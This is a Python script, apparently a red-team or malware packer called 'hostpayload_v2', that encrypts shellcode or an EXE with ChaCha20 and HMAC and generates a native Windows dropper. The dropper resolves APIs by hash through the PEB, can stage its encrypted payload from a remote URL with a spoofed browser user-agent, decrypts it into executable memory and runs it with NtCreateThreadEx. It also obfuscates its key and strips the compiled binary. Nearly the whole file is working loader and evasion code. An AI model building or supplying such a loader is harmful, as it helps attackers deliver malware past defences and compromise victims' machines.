#!/usr/bin/env python3
"""
hostpayload_v2 packer

Encrypts a payload with ChaCha20 + HMAC-SHA256 and emits a small native
Windows dropper (C source or compiled EXE). The dropper resolves all APIs
via the PEB, fetches (or embeds) the encrypted blob, decrypts it into
RW->RX memory, and executes it with NtCreateThreadEx.

Usage:
    python3 pack.py --payload payload.bin --output dropper.exe
    python3 pack.py --payload payload.bin --url https://cdn.example.com/s.bin --output dropper.exe
"""

import argparse
import os
import random
import struct
import subprocess
import sys
from pathlib import Path

from Crypto.Cipher import ChaCha20


H_MAGIC_KEY = 0x811C9DC5
H_MAGIC_PRIME = 0x01000193


def fnv1a32(s: str) -> int:
    h = H_MAGIC_KEY
    for c in s:
        b = ord(c)
        if 0x61 <= b <= 0x7A:
            b -= 0x20
        h ^= b
        h = (h * H_MAGIC_PRIME) & 0xFFFFFFFF
    return h


def fnv_define(name: str) -> str:
    key = name.upper().replace(".", "_").replace("-", "_")
    return f"#define H_{key:<36} 0x{fnv1a32(name):08X}u  /* {name} */"


API_NAMES = [
    "kernel32.dll",
    "ntdll.dll",
    "winhttp.dll",
    "LoadLibraryW",
    "GetProcAddress",
    "GetTickCount64",
    "GetSystemInfo",
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtCreateThreadEx",
    "NtWaitForSingleObject",
    "NtQuerySystemInformation",
    "LdrLoadDll",
    "NtClose",
    "WinHttpOpen",
    "WinHttpConnect",
    "WinHttpOpenRequest",
    "WinHttpSendRequest",
    "WinHttpReceiveResponse",
    "WinHttpQueryDataAvailable",
    "WinHttpReadData",
    "WinHttpCloseHandle",
    "WinHttpSetOption",
    "WinHttpSetTimeouts",
    "GetProcessHeap",
    "HeapAlloc",
    "HeapFree",
]


def hash_block() -> str:
    return "\n".join(fnv_define(n) for n in API_NAMES)


def hmac_sha256(key: bytes, msg: bytes) -> bytes:
    from Crypto.Hash import HMAC, SHA256
    return HMAC.new(key, msg, digestmod=SHA256).digest()


def encrypt_payload(plaintext: bytes, key: bytes) -> tuple[bytes, bytes, bytes]:
    if len(key) != 32:
        raise ValueError("key must be 32 bytes")
    nonce = os.urandom(12)
    cipher = ChaCha20.new(key=key, nonce=nonce)
    ciphertext = cipher.encrypt(plaintext)
    mac = hmac_sha256(key, ciphertext)
    return nonce, ciphertext, mac


def parse_url(url: str) -> tuple[str, int, str, bool]:
    if not url.startswith(("http://", "https://")):
        raise ValueError("URL must start with http:// or https://")
    use_https = url.startswith("https://")
    rest = url[(8 if use_https else 7):]
    host_port, _, path = rest.partition("/")
    if not path:
        path = "/"
    if ":" in host_port:
        host, port_s = host_port.rsplit(":", 1)
        port = int(port_s)
    else:
        host = host_port
        port = 443 if use_https else 80
    return host, port, "/" + path, use_https


def wide_literal(s: str) -> str:
    # C wide string literal: L"..."
    return f'L"{s}"'


def bytes_array(name: str, data: bytes) -> str:
    parts = ", ".join(f"0x{b:02x}" for b in data)
    return f"static const BYTE {name}[{len(data)}] __attribute__((used, section(\".rdata\"))) = {{ {parts} }};"


def generate_dropper_c(template: str, ciphertext: bytes, nonce: bytes, mac: bytes,
                       key: bytes, obf_byte: int, url_info: tuple | None,
                       user_agent: str, ignore_cert: bool = False) -> str:
    mode_embed = 1 if url_info is None else 0
    host, port, path, use_https = url_info if url_info else ("", 0, "", False)

    key_obf = bytes(k ^ obf_byte for k in key)

    replacements = {
        "__API_HASHES__": hash_block(),
        "__H_GETPROCESSHEAP__": f"0x{fnv1a32('GetProcessHeap'):08X}u",
        "__H_HEAPALLOC__": f"0x{fnv1a32('HeapAlloc'):08X}u",
        "__H_HEAPFREE__": f"0x{fnv1a32('HeapFree'):08X}u",
        "__H_GETSYSTEMINFO__": f"0x{fnv1a32('GetSystemInfo'):08X}u",
        "__H_GETTICKCOUNT64__": f"0x{fnv1a32('GetTickCount64'):08X}u",
        "__MODE_EMBED__": "1" if mode_embed else "0",
        "__FETCH_USE_HTTPS__": "1" if use_https else "0",
        "__FETCH_IGNORE_CERT__": "1" if ignore_cert else "0",
        "__FETCH_HOST__": wide_literal(host),
        "__FETCH_PATH__": wide_literal(path),
        "__FETCH_PORT__": str(port),
        "__OBF_BYTE__": f"0x{obf_byte:02x}",
        "__KEY_ARRAY__": bytes_array("EKEY", key_obf),
        "__NONCE_ARRAY__": bytes_array("NONCE", nonce),
        "__HMAC_ARRAY__": bytes_array("HMAC", mac),
        "__PAYLOAD_ARRAY__": bytes_array("PAYLOAD", ciphertext) if mode_embed else "/* staged payload fetched at runtime */",
        "__PAYLOAD_LEN__": str(len(ciphertext)),
        "__USER_AGENT__": wide_literal(user_agent),
    }

    for marker, value in replacements.items():
        template = template.replace(marker, value)
    return template


def compile_dropper(c_path: Path, exe_path: Path) -> None:
    cc = "x86_64-w64-mingw32-gcc"
    args = [
        cc,
        "-Os",
        "-nostdlib",
        "-fno-asynchronous-unwind-tables",
        "-fno-ident",
        "-fvisibility=hidden",
        "-ffunction-sections",
        "-fno-builtin",
        "-fno-stack-check",
        "-m64",
        "-Wl,--strip-all",
        "-Wl,--entry,DropperEntry",
        "-Wl,--subsystem,windows",
        str(c_path),
        "-o", str(exe_path),
    ]
    print(f"[+] compiling: {' '.join(args)}")
    subprocess.run(args, check=True)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--payload", required=True, help="raw payload file (shellcode/EXE)")
    parser.add_argument("--output", required=True, help="output path (.exe, .c, or .bin with --blob)")
    parser.add_argument("--url", help="stage encrypted blob from this HTTPS URL")
    parser.add_argument("--ignore-cert", action="store_true", help="ignore TLS cert errors (lab only)")
    parser.add_argument("--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36")
    parser.add_argument("--keep-source", action="store_true", help="keep generated C source next to output")
    parser.add_argument("--blob", action="store_true", help="also write the encrypted blob (nonce||ciphertext||hmac) to --output path + .bin")
    parser.add_argument("--format", choices=["exe", "c"], help="force output type; default is inferred from --output suffix")
    args = parser.parse_args()

    payload = Path(args.payload).read_bytes()
    if not payload:
        print("[!] payload is empty", file=sys.stderr)
        return 1

    key = os.urandom(32)
    nonce, ciphertext, mac = encrypt_payload(payload, key)
    obf_byte = random.randint(1, 255)

    url_info = parse_url(args.url) if args.url else None

    template_path = Path(__file__).parent / "src" / "dropper_template.c"
    template = template_path.read_text()

    source = generate_dropper_c(template, ciphertext, nonce, mac, key, obf_byte,
                                url_info, args.user_agent, args.ignore_cert)

    out = Path(args.output)
    out_format = args.format or ("c" if out.suffix.lower() == ".c" else "exe")

    if out_format == "c":
        out.write_text(source)
        print(f"[+] wrote source {out} ({len(source)} chars)")
    else:
        # Write source to a temp file and compile
        src_path = out.with_suffix(".c")
        src_path.write_text(source)
        try:
            compile_dropper(src_path, out)
            print(f"[+] wrote {out}")
            if not args.keep_source:
                src_path.unlink()
        except subprocess.CalledProcessError as e:
            print(f"[!] compile failed: {e}", file=sys.stderr)
            print(f"[*] source kept at {src_path}")
            return 1

    if args.blob:
        blob_path = out.parent / (out.stem + ".bin")
        blob = nonce + ciphertext + mac
        blob_path.write_bytes(blob)
        print(f"[+] wrote encrypted blob {blob_path} ({len(blob)} bytes)")

    return 0


if __name__ == "__main__":
    sys.exit(main())
